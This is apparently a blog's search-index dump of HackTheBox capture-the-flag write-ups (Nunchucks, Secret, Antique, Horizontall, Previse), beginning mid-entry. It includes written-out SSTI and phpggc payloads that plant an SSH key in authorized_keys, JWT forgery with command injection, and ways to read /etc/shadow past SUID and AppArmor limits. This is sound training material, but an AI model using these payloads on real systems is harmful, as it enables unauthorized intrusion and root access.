AAAAB3NzaC1yc2EAAAADAQABAAABAQDo+qtyTekC0IbR253hJRsWT9Q+wCFVUEwHS7/VZJEOvePL+oIm2LZp9G1ml3FToU6Qr2MtB83tJU7mMFqcKm3mfVTj+lpJzP+XO4A/xHzLiqhZScv56FM0JaZqz65/Oca4FF4AiNS0gOwJ7vu5sARMYFbb5jsd266eCFvymRLobt3Ujzo5lqcRiLOgZPVCasfHU0vPCNGTaMvDKyklhwSCsMbKjOxuozbwZwJ1ApsCkkx7bx277DGgOI6G/rLYFkc/W/+Y9hxqp4RifUzgu6GACKDIKyAnszWxZHNMT/Iokkcn35Xd5p/ykVgrjLBDQKCxTr4Org/M7L9xhvd19GbH kali@kali \u0026gt; /home/david/.ssh/authorized_keys')\\\u0026quot;)()}} {{range.constructor(\\\u0026quot;return global.process.mainModule.require('child_process').execSync('chmod 600 /home/david/.ssh/authorized_keys')\\\u0026quot;)()}} Root We have a perl file in /opt directory that backups web directories It has POSIX::setuid(0) to run as root Let\u0026rsquo;s check perl Since it has to have SUID or setuid capabilities david@nunchucks:~$ which perl /usr/bin/perl david@nunchucks:~$ getcap /usr/bin/perl /usr/bin/perl = cap_setuid+ep Following GTFOBins had no success But when I execuite whoami, it returns root If we create a pl script and try to execute it #!/usr/bin/perl use POSIX qw(strftime); use POSIX qw(setuid); POSIX::setuid(0); exec \u0026#34;/bin/sh\u0026#34; We have Permission denied error It happened that we have AppArmor application which defines access controls to binaries in Linux /etc/apparmor.d david@nunchucks:/tmp$ ls -lha /etc/apparmor.d/ total 72K drwxr-xr-x 7 root root 4.0K Oct 28 2021 . drwxr-xr-x 125 root root 12K Aug 16 16:07 .. drwxr-xr-x 4 root root 4.0K Oct 28 2021 abstractions drwxr-xr-x 2 root root 4.0K Oct 28 2021 disable drwxr-xr-x 2 root root 4.0K Oct 28 2021 force-complain drwxr-xr-x 2 root root 4.0K Oct 28 2021 local -rw-r--r-- 1 root root 1.3K May 19 2020 lsb_release -rw-r--r-- 1 root root 1.1K May 19 2020 nvidia_modprobe -rw-r--r-- 1 root root 3.2K Mar 11 2020 sbin.dhclient drwxr-xr-x 5 root root 4.0K Oct 28 2021 tunables -rw-r--r-- 1 root root 3.2K Feb 25 2020 usr.bin.man -rw-r--r-- 1 root root 442 Sep 26 2021 usr.bin.perl -rw-r--r-- 1 root root 672 Feb 19 2020 usr.sbin.ippusbxd -rw-r--r-- 1 root root 2.0K Jul 22 2021 usr.sbin.mysqld -rw-r--r-- 1 root root 1.6K Feb 11 2020 usr.sbin.rsyslogd -rw-r--r-- 1 root root 1.4K Dec 7 2019 usr.sbin.tcpdump david@nunchucks:/tmp$ cat /etc/apparmor.d/usr.bin.perl # Last Modified: Tue Aug 31 18:25:30 2021 #include \u0026lt;tunables/global\u0026gt; /usr/bin/perl { #include \u0026lt;abstractions/base\u0026gt; #include \u0026lt;abstractions/nameservice\u0026gt; #include \u0026lt;abstractions/perl\u0026gt; capability setuid, deny owner /etc/nsswitch.conf r, deny /root/* rwx, deny /etc/shadow rwx, /usr/bin/id mrix, /usr/bin/ls mrix, /usr/bin/cat mrix, /usr/bin/whoami mrix, /opt/backup.pl mrix, owner /home/ r, owner /home/david/ r, } So we can\u0026rsquo;t access /root/* and /etc/shadow But if we google we have a way to bypass it Shebang bypass chmod +x test.pl And simply run ./test.pl ","date":"August 15, 2023","hero":"/posts/cybersecurity/hackthebox/machines/linux/nunchucks/images/nunchucks.png","permalink":"https://umarbaevb.github.io/posts/cybersecurity/hackthebox/machines/linux/nunchucks/","summary":"Nunchucks Enumeration nmap └─$ nmap -sC -sV -Pn 10.10.11.122 -T4 Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-16 17:10 BST Nmap scan report for 10.10.11.122 (10.10.11.122) Host is up (0.13s latency). Not shown: 997 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 6c:14:6d:bb:74:59:c3:78:2e:48:f5:11:d8:5b:47:21 (RSA) | 256 a2:f4:2c:42:74:65:a3:7c:26:dd:49:72:23:82:72:71 (ECDSA) |_ 256 e1:8d:44:e7:21:6d:7c:13:2f:ea:3b:83:58:aa:02:b3 (ED25519) 80/tcp open http nginx 1.","tags":["HTB","wfuzz","vhosts","ssti","express","express-nunchucks","capabilities","gtfobins","apparmor","perl"],"title":"[HTB] Machine: Nunchucks"},{"categories":null,"contents":"Secret Enumeration nmap └─$ nmap -sC -sV -Pn 10.10.11.120 -T4 Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-17 14:59 BST Nmap scan report for 10.10.11.120 (10.10.11.120) Host is up (0.18s latency). Not shown: 997 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 97:af:61:44:10:89:b9:53:f0:80:3f:d7:19:b1:e2:9c (RSA) | 256 95:ed:65:8d:cd:08:2b:55:dd:17:51:31:1e:3e:18:12 (ECDSA) |_ 256 33:7b:c1:71:d3:33:0f:92:4e:83:5a:1f:52:02:93:5e (ED25519) 80/tcp open http nginx 1.18.0 (Ubuntu) |_http-title: DUMB Docs |_http-server-header: nginx/1.18.0 (Ubuntu) 3000/tcp open http Node.js (Express middleware) |_http-title: DUMB Docs Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 33.49 seconds Web Server We can also download source code gobuster └─$ gobuster dir -u http://10.10.11.120 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 50 -x php,txt =============================================================== Gobuster v3.5 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://10.10.11.120 [+] Method: GET [+] Threads: 50 [+] Wordlist: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.5 [+] Extensions: php,txt [+] Timeout: 10s =============================================================== 2023/08/17 16:27:28 Starting gobuster in directory enumeration mode =============================================================== /download (Status: 301) [Size: 183] [--\u0026gt; /download/] /docs (Status: 200) [Size: 20720] /assets (Status: 301) [Size: 179] [--\u0026gt; /assets/] /api (Status: 200) [Size: 93] /Docs (Status: 200) [Size: 20720] /API (Status: 200) [Size: 93] /DOCS (Status: 200) [Size: 20720] Foothold/User Let\u0026rsquo;s check source code └─$ ls -lha total 116K drwxr-xr-x 8 kali kali 4.0K Sep 3 2021 . drwxr-xr-x 14 kali kali 4.0K Aug 17 16:55 .. -rw-r--r-- 1 kali kali 72 Sep 3 2021 .env drwxr-xr-x 8 kali kali 4.0K Aug 17 16:55 .git -rw-r--r-- 1 kali kali 885 Sep 3 2021 index.js drwxr-xr-x 2 kali kali 4.0K Aug 13 2021 model drwxr-xr-x 201 kali kali 4.0K Aug 13 2021 node_modules -rw-r--r-- 1 kali kali 491 Aug 13 2021 package.json -rw-r--r-- 1 kali kali 68K Aug 13 2021 package-lock.json drwxr-xr-x 4 kali kali 4.0K Sep 3 2021 public drwxr-xr-x 2 kali kali 4.0K Sep 3 2021 routes drwxr-xr-x 4 kali kali 4.0K Aug 13 2021 src -rw-r--r-- 1 kali kali 651 Aug 13 2021 validations.js We have a .env and .git Let\u0026rsquo;s check the commit 67d8da7, which removed TOKEN_SECRET └─$ git show 67d8da7 commit 67d8da7a0e53d8fadeb6b36396d86cdcd4f6ec78 Author: dasithsv \u0026lt;dasithsv@gmail.com\u0026gt; Date: Fri Sep 3 11:30:17 2021 +0530 removed .env for security reasons diff --git a/.env b/.env index fb6f587..31db370 100644 --- a/.env +++ b/.env @@ -1,2 +1,2 @@ DB_CONNECT = \u0026#39;mongodb://127.0.0.1:27017/auth-web\u0026#39; -TOKEN_SECRET = gXr67TtoQL8TShUc8XYsK2HvsBYfyQSFCFZe4MQp7gRpFuMkKjcM72CNQN4fMfbZEKx4i7YiWuNAkmuTcdEriCMm9vPAYkhpwPTiuVwVhvwE +TOKEN_SECRET = secret Okay, now we can check source files and find where this token is used The token is used to sing jwt token when user logins We have forgot.js and private.js files In private.js we have /logs route which checks if user is theadmin Notice that git log --oneline ${file} is supplied to exec function, so potential command injection Let\u0026rsquo;s forge the jwt token for theadmin user I used https://jwt.io/ Now we can try command injection Let\u0026rsquo;s ping our attack box And we get our revshell Root Enumerate /opt has custom count binary with suid bit dasith@secret:/opt$ ls -lha total 56K drwxr-xr-x 2 root root 4.0K Oct 7 2021 . drwxr-xr-x 20 root root 4.0K Oct 7 2021 .. -rw-r--r-- 1 root root 3.7K Oct 7 2021 code.c -rw-r--r-- 1 root root 16K Oct 7 2021 .code.c.swp -rwsr-xr-x 1 root root 18K Oct 7 2021 count -rw-r--r-- 1 root root 4.6K Oct 7 2021 valgrind.log According to source file, the binary gets the stats of the file/directory Then it drops the privileges int main() { char path[100]; int res; struct stat path_s; char summary[4096]; printf(\u0026#34;Enter source file/directory name: \u0026#34;); scanf(\u0026#34;%99s\u0026#34;, path); getchar(); stat(path, \u0026amp;path_s); if(S_ISDIR(path_s.st_mode)) dircount(path, summary); else filecount(path, summary); // drop privs to limit file write setuid(getuid()); // Enable coredump generation prctl(PR_SET_DUMPABLE, 1); printf(\u0026#34;Save results a file? [y/N]: \u0026#34;); res = getchar(); if (res == 121 || res == 89) { printf(\u0026#34;Path: \u0026#34;); scanf(\u0026#34;%99s\u0026#34;, path); FILE *fp = fopen(path, \u0026#34;a\u0026#34;); if (fp != NULL) { fputs(summary, fp); fclose(fp); } else { printf(\u0026#34;Could not open %s for writing\\n\u0026#34;, path); } } return 0; } We see the comment // Enable coredump generation, which is a hint We can supply a file, send SIGSEGV (kill -SIGSEGV or kill -11) and read that file from the dump Let\u0026rsquo;s try with /etc/shadow We can use apport-unpack to unpack dump file If we check CoreDump we see the content of the /etc/shadow So now we can either dump id_rsa of the root or crack the hash ","date":"August 15, 2023","hero":"/posts/cybersecurity/hackthebox/machines/linux/secret/images/secret.png","permalink":"https://umarbaevb.github.io/posts/cybersecurity/hackthebox/machines/linux/secret/","summary":"Secret Enumeration nmap └─$ nmap -sC -sV -Pn 10.10.11.120 -T4 Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-17 14:59 BST Nmap scan report for 10.10.11.120 (10.10.11.120) Host is up (0.18s latency). Not shown: 997 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 97:af:61:44:10:89:b9:53:f0:80:3f:d7:19:b1:e2:9c (RSA) | 256 95:ed:65:8d:cd:08:2b:55:dd:17:51:31:1e:3e:18:12 (ECDSA) |_ 256 33:7b:c1:71:d3:33:0f:92:4e:83:5a:1f:52:02:93:5e (ED25519) 80/tcp open http nginx 1.","tags":["HTB","jwt pyjwt express","api","source-code","git","command-injection","suid","crash-dump","var-crash","appport-unpack","core-dump"],"title":"[HTB] Machine: Secret"},{"categories":null,"contents":"Antique Enumeration nmap └─$ nmap -sC -sV -Pn 10.10.11.107 Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-09 15:59 BST Nmap scan report for 10.10.11.107 (10.10.11.107) Host is up (0.12s latency). Not shown: 999 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 23/tcp open telnet? | fingerprint-strings: | DNSStatusRequestTCP, DNSVersionBindReqTCP, FourOhFourRequest, GenericLines, GetRequest, HTTPOptions, Help, JavaRMI, Kerberos, LANDesk-RC, LDAPBindReq, LDAPSearchReq, LPDString, NCP, NotesRPC, RPCCheck, RTSPRequest, SIPOptions, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServer, TerminalServerCookie, WMSRequest, X11Probe, afp, giop, ms-sql-s, oracle-tns, tn3270: | JetDirect | Password: | NULL: |_ JetDirect 1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service : SF-Port23-TCP:V=7.94%I=7%D=8/9%Time=64D3A9E6%P=x86_64-pc-linux-gnu%r(NULL, SF:F,\u0026#34;\\nHP\\x20JetDirect\\n\\n\u0026#34;)%r(GenericLines,19,\u0026#34;\\nHP\\x20JetDirect\\n\\nPass SF:word:\\x20\u0026#34;)%r(tn3270,19,\u0026#34;\\nHP\\x20JetDirect\\n\\nPassword:\\x20\u0026#34;)%r(GetRequ SF:est,19,\u0026#34;\\nHP\\x20JetDirect\\n\\nPassword:\\x20\u0026#34;)%r(HTTPOptions,19,\u0026#34;\\nHP\\x20 SF:JetDirect\\n\\nPassword:\\x20\u0026#34;)%r(RTSPRequest,19,\u0026#34;\\nHP\\x20JetDirect\\n\\nPas SF:sword:\\x20\u0026#34;)%r(RPCCheck,19,\u0026#34;\\nHP\\x20JetDirect\\n\\nPassword:\\x20\u0026#34;)%r(DNSV SF:ersionBindReqTCP,19,\u0026#34;\\nHP\\x20JetDirect\\n\\nPassword:\\x20\u0026#34;)%r(DNSStatusRe SF:questTCP,19,\u0026#34;\\nHP\\x20JetDirect\\n\\nPassword:\\x20\u0026#34;)%r(Help,19,\u0026#34;\\nHP\\x20Je SF:tDirect\\n\\nPassword:\\x20\u0026#34;)%r(SSLSessionReq,19,\u0026#34;\\nHP\\x20JetDirect\\n\\nPas SF:sword:\\x20\u0026#34;)%r(TerminalServerCookie,19,\u0026#34;\\nHP\\x20JetDirect\\n\\nPassword:\\ SF:x20\u0026#34;)%r(TLSSessionReq,19,\u0026#34;\\nHP\\x20JetDirect\\n\\nPassword:\\x20\u0026#34;)%r(Kerber SF:os,19,\u0026#34;\\nHP\\x20JetDirect\\n\\nPassword:\\x20\u0026#34;)%r(SMBProgNeg,19,\u0026#34;\\nHP\\x20Je SF:tDirect\\n\\nPassword:\\x20\u0026#34;)%r(X11Probe,19,\u0026#34;\\nHP\\x20JetDirect\\n\\nPassword SF::\\x20\u0026#34;)%r(FourOhFourRequest,19,\u0026#34;\\nHP\\x20JetDirect\\n\\nPassword:\\x20\u0026#34;)%r( SF:LPDString,19,\u0026#34;\\nHP\\x20JetDirect\\n\\nPassword:\\x20\u0026#34;)%r(LDAPSearchReq,19,\u0026#34; SF:\\nHP\\x20JetDirect\\n\\nPassword:\\x20\u0026#34;)%r(LDAPBindReq,19,\u0026#34;\\nHP\\x20JetDirec SF:t\\n\\nPassword:\\x20\u0026#34;)%r(SIPOptions,19,\u0026#34;\\nHP\\x20JetDirect\\n\\nPassword:\\x2 SF:0\u0026#34;)%r(LANDesk-RC,19,\u0026#34;\\nHP\\x20JetDirect\\n\\nPassword:\\x20\u0026#34;)%r(TerminalSer SF:ver,19,\u0026#34;\\nHP\\x20JetDirect\\n\\nPassword:\\x20\u0026#34;)%r(NCP,19,\u0026#34;\\nHP\\x20JetDirec SF:t\\n\\nPassword:\\x20\u0026#34;)%r(NotesRPC,19,\u0026#34;\\nHP\\x20JetDirect\\n\\nPassword:\\x20\u0026#34; SF:)%r(JavaRMI,19,\u0026#34;\\nHP\\x20JetDirect\\n\\nPassword:\\x20\u0026#34;)%r(WMSRequest,19,\u0026#34;\\ SF:nHP\\x20JetDirect\\n\\nPassword:\\x20\u0026#34;)%r(oracle-tns,19,\u0026#34;\\nHP\\x20JetDirect\\ SF:n\\nPassword:\\x20\u0026#34;)%r(ms-sql-s,19,\u0026#34;\\nHP\\x20JetDirect\\n\\nPassword:\\x20\u0026#34;)% SF:r(afp,19,\u0026#34;\\nHP\\x20JetDirect\\n\\nPassword:\\x20\u0026#34;)%r(giop,19,\u0026#34;\\nHP\\x20JetDi SF:rect\\n\\nPassword:\\x20\u0026#34;); Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 181.59 seconds telnet └─$ telnet 10.10.11.107 Trying 10.10.11.107... Connected to 10.10.11.107. Escape character is \u0026#39;^]\u0026#39;. HP JetDirect Password: admin Invalid password Connection closed by foreign host. Nothing to see, so I scanned UDP ports └─$ sudo nmap -sU -sV 10.10.11.107 [sudo] password for kali: Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-09 16:38 BST Stats: 0:09:01 elapsed; 0 hosts completed (1 up), 1 undergoing UDP Scan Nmap scan report for 10.10.11.107 (10.10.11.107) Host is up (0.10s latency). Not shown: 999 closed udp ports (port-unreach) PORT STATE SERVICE VERSION 161/udp open snmp SNMPv1 server (public) Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 1013.71 seconds snmp └─$ snmpwalk -v 2c -c public 10.10.11.107 iso.3.6.1.2.1 = STRING: \u0026#34;HTB Printer\u0026#34; Foothold/User According to this post we can retrieve password We need to ask for .1.3.6.1.4.1.11.2.3.9.1.1.13.0 └─$ snmpwalk -v 2c -c public 10.10.11.107 .1.3.6.1.4.1.11.2.3.9.1.1.13.0 iso.3.6.1.4.1.11.2.3.9.1.1.13.0 = BITS: 50 40 73 73 77 30 72 64 40 31 32 33 21 21 31 32 33 1 3 9 17 18 19 22 23 25 26 27 30 31 33 34 35 37 38 39 42 43 49 50 51 54 57 58 61 65 74 75 79 82 83 86 90 91 94 95 98 103 106 111 114 115 119 122 123 126 130 131 134 135 Now we need to convert it from hex to ascii Try password for telnet P@ssw0rd@123!!123 Let\u0026rsquo;s call help menu Now let\u0026rsquo;s try get execution and reverse shell Root Enumeration shows port 631 open lp@antique:~$ netstat -tulnp (Not all processes could be identified, non-owned process info will not be shown, you would have to be root to see it all.) Active Internet connections (only servers) Proto Recv-Q Send-Q Local Address Foreign Address State PID/Program name tcp 0 0 0.0.0.0:23 0.0.0.0:* LISTEN 1016/python3 tcp 0 0 127.0.0.1:631 0.0.0.0:* LISTEN - tcp6 0 0 ::1:631 :::* LISTEN - udp 0 0 0.0.0.0:161 0.0.0.0:* We can perform port forwarding using chisel Or check the list of processes and take a guess We see cups service Checking config shows that indeed port 631 belongs to cups If we curl we see the version is 1.6.1 If we check github post We see that we need to call cupsctl ErrorLog={FILE} And then curl 127.0.0.1:631/admin/log/error_log? So let\u0026rsquo;s read shadow file It works, but it\u0026rsquo;s not crackable ","date":"August 8, 2023","hero":"/posts/cybersecurity/hackthebox/machines/linux/antique/images/antique.png","permalink":"https://umarbaevb.github.io/posts/cybersecurity/hackthebox/machines/linux/antique/","summary":"Antique Enumeration nmap └─$ nmap -sC -sV -Pn 10.10.11.107 Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-09 15:59 BST Nmap scan report for 10.10.11.107 (10.10.11.107) Host is up (0.12s latency). Not shown: 999 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 23/tcp open telnet? | fingerprint-strings: | DNSStatusRequestTCP, DNSVersionBindReqTCP, FourOhFourRequest, GenericLines, GetRequest, HTTPOptions, Help, JavaRMI, Kerberos, LANDesk-RC, LDAPBindReq, LDAPSearchReq, LPDString, NCP, NotesRPC, RPCCheck, RTSPRequest, SIPOptions, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServer, TerminalServerCookie, WMSRequest, X11Probe, afp, giop, ms-sql-s, oracle-tns, tn3270: | JetDirect | Password: | NULL: |_ JetDirect 1 service unrecognized despite returning data.","tags":["HTB","printer","jetdirect","telnet","snmp","snmpwalk","cups","cve-2012-5519","hashcat","shadow"],"title":"[HTB] Machine: Antique"},{"categories":null,"contents":"Horizontall Enumeration nmap └─$ nmap -sC -sV -Pn 10.10.11.105 -T4 Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-15 17:34 BST Nmap scan report for 10.10.11.105 (10.10.11.105) Host is up (0.16s latency). Not shown: 998 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 ee:77:41:43:d4:82:bd:3e:6e:6e:50:cd:ff:6b:0d:d5 (RSA) | 256 3a:d5:89:d5:da:95:59:d9:df:01:68:37:ca:d5:10:b0 (ECDSA) |_ 256 4a:00:04:b4:9d:29:e7:af:37:16:1b:4f:80:2d:98:94 (ED25519) 80/tcp open http nginx 1.14.0 (Ubuntu) |_http-title: Did not follow redirect to http://horizontall.htb |_http-server-header: nginx/1.14.0 (Ubuntu) Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 32.09 seconds Web Server gobuster └─$ gobuster dir -u http://horizontall.htb/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 50 -x txt =============================================================== Gobuster v3.5 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://horizontall.htb/ [+] Method: GET [+] Threads: 50 [+] Wordlist: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.5 [+] Extensions: txt [+] Timeout: 10s =============================================================== 2023/08/15 17:54:27 Starting gobuster in directory enumeration mode =============================================================== /img (Status: 301) [Size: 194] [--\u0026gt; http://horizontall.htb/img/] /css (Status: 301) [Size: 194] [--\u0026gt; http://horizontall.htb/css/] /js (Status: 301) [Size: 194] [--\u0026gt; http://horizontall.htb/js/] ffuf └─$ ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -u \u0026#39;http://10.10.11.105/\u0026#39; -H \u0026#39;Host: FUZZ.horizontall.htb\u0026#39; -fw 7 /\u0026#39;___\\ /\u0026#39;___\\ /\u0026#39;___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ v2.0.0-dev ________________________________________________ :: Method : GET :: URL : http://10.10.11.105/ :: Wordlist : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt :: Header : Host: FUZZ.horizontall.htb :: Follow redirects : false :: Calibration : false :: Timeout : 10 :: Threads : 40 :: Matcher : Response status: 200,204,301,302,307,401,403,405,500 :: Filter : Response words: 7 ________________________________________________ [Status: 200, Size: 901, Words: 43, Lines: 2, Duration: 109ms] * FUZZ: www We find another vhost in js file Foothold/User http://api-prod.horizontall.htb/reviews Let\u0026rsquo;s gobuster again └─$ gobuster dir -u http://api-prod.horizontall.htb/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 50 =============================================================== Gobuster v3.5 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://api-prod.horizontall.htb/ [+] Method: GET [+] Threads: 50 [+] Wordlist: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.5 [+] Timeout: 10s =============================================================== 2023/08/15 17:59:30 Starting gobuster in directory enumeration mode =============================================================== /reviews (Status: 200) [Size: 507] /users (Status: 403) [Size: 60] /admin (Status: 200) [Size: 854] http://api-prod.horizontall.htb/admin We have strapi Let\u0026rsquo;s check exploits Googling shows exploit to reset admin password http://api-prod.horizontall.htb/admin/strapiVersion We have strapiVersion\t\u0026quot;3.0.0-beta.17.4\u0026quot; Another exploit with RCE Let\u0026rsquo;s try them Now let\u0026rsquo;s try RCE There\u0026rsquo;s a nice blog with POC We can open the same request in Burp Add Content-Type and Authorization headers Copy the payload from the post and send it Root Let\u0026rsquo;s enumerate We have port 8000 strapi@horizontall:~$ netstat -tulpn Active Internet connections (only servers) Proto Recv-Q Send-Q Local Address Foreign Address State PID/Program name tcp 0 0 127.0.0.1:3306 0.0.0.0:* LISTEN - tcp 0 0 0.0.0.0:80 0.0.0.0:* LISTEN - tcp 0 0 0.0.0.0:22 0.0.0.0:* LISTEN - tcp 0 0 127.0.0.1:1337 0.0.0.0:* LISTEN 1802/node /usr/bin/ tcp 0 0 127.0.0.1:8000 0.0.0.0:* LISTEN - tcp6 0 0 :::80 :::* LISTEN - tcp6 0 0 :::22 :::* LISTEN - We can either upload chisel or use ssh port forwarding, If we use ssh version, we don\u0026rsquo;t have .ssh folder and authorized_keys for strapi Let\u0026rsquo;s try and create them Let\u0026rsquo;s add public key to authorized_keys so we can ssh We have Laravel Let\u0026rsquo;s gobuster └─$ gobuster dir -u http://localhost:8000/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 50 -x php,txt --no-error =============================================================== Gobuster v3.5 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://localhost:8000/ [+] Method: GET [+] Threads: 50 [+] Wordlist: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.5 [+] Extensions: php,txt [+] Timeout: 10s =============================================================== 2023/08/15 18:52:07 Starting gobuster in directory enumeration mode =============================================================== /index.php (Status: 200) [Size: 17473] /server.php (Status: 200) [Size: 17473] /profiles (Status: 500) [Size: 616200] /profiles Looks like debug mode is on Laravel If we google for laravel debug mode exploit We have a post And poc Let\u0026rsquo;s try Generate payload php -d'phar.readonly=0' ~/Documents/Tools/phpggc/phpggc --phar phar -o ssh.phar --fast-destruct monolog/rce1 system 'mkdir -p /root/.ssh; echo \u0026quot;ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDo+qtyTekC0IbR253hJRsWT9Q+wCFVUEwHS7/VZJEOvePL+oIm2LZp9G1ml3FToU6Qr2MtB83tJU7mMFqcKm3mfVTj+lpJzP+XO4A/xHzLiqhZScv56FM0JaZqz65/Oca4FF4AiNS0gOwJ7vu5sARMYFbb5jsd266eCFvymRLobt3Ujzo5lqcRiLOgZPVCasfHU0vPCNGTaMvDKyklhwSCsMbKjOxuozbwZwJ1ApsCkkx7bx277DGgOI6G/rLYFkc/W/+Y9hxqp4RifUzgu6GACKDIKyAnszWxZHNMT/Iokkcn35Xd5p/ykVgrjLBDQKCxTr4Org/M7L9xhvd19GbH kali@kali\u0026quot; \u0026gt;\u0026gt; /root/.ssh/authorized_keys' And run exploit ","date":"August 8, 2023","hero":"/posts/cybersecurity/hackthebox/machines/linux/horizontall/images/horizontall.png","permalink":"https://umarbaevb.github.io/posts/cybersecurity/hackthebox/machines/linux/horizontall/","summary":"Horizontall Enumeration nmap └─$ nmap -sC -sV -Pn 10.10.11.105 -T4 Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-15 17:34 BST Nmap scan report for 10.10.11.105 (10.10.11.105) Host is up (0.16s latency). Not shown: 998 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 ee:77:41:43:d4:82:bd:3e:6e:6e:50:cd:ff:6b:0d:d5 (RSA) | 256 3a:d5:89:d5:da:95:59:d9:df:01:68:37:ca:d5:10:b0 (ECDSA) |_ 256 4a:00:04:b4:9d:29:e7:af:37:16:1b:4f:80:2d:98:94 (ED25519) 80/tcp open http nginx 1.","tags":["HTB","vhosts","strapi","cve-2019-18818","cve-2019-19609","command-injection","laravel","phpggc","deserialization"],"title":"[HTB] Machine: Horizontall"},{"categories":null,"contents":"Previse Enumeration nmap └─$ nmap -sC -sV -Pn 10.10.11.104 -T4 Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-15 20:03 BST Nmap scan report for 10.10.11.104 (10.10.11.104) Host is up (0.14s latency). Not shown: 998 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 53:ed:44:40:11:6e:8b:da:69:85:79:c0:81:f2:3a:12 (RSA) | 256 bc:54:20:ac:17:23:bb:50:20:f4:e1:6e:62:0f:01:b5 (ECDSA) |_ 256 33:c1:89:ea:59:73:b1:78:84:38:a4:21:10:0c:91:d8 (ED25519) 80/tcp open http Apache httpd 2.4.29 ((Ubuntu)) | http-cookie-flags: | /: | PHPSESSID: |_ httponly flag not set |_http-server-header: Apache/2.4.29 (Ubuntu) | http-title: Previse Login |_Requested resource was login.php Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 25.90 seconds Web Server If we check burp we can see that visiting / redirects to login.php But / page also returns a valid full page It\u0026rsquo;s a execution after redirect (EAR) vulnerability gobuster └─$ gobuster dir -u http://10.10.11.104 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 50 -x txt,php --no-error =============================================================== Gobuster v3.5 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://10.10.11.104 [+] Method: GET [+] Threads: 50 [+] Wordlist: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.5 [+] Extensions: txt,php [+] Timeout: 10s =============================================================== 2023/08/16 16:07:17 Starting gobuster in directory enumeration mode =============================================================== /index.php (Status: 302) [Size: 2801] [--\u0026gt; login.php] /.php (Status: 403) [Size: 277] /download.php (Status: 302) [Size: 0] [--\u0026gt; login.php] /login.php (Status: 200) [Size: 2224] /files.php (Status: 302) [Size: 4914] 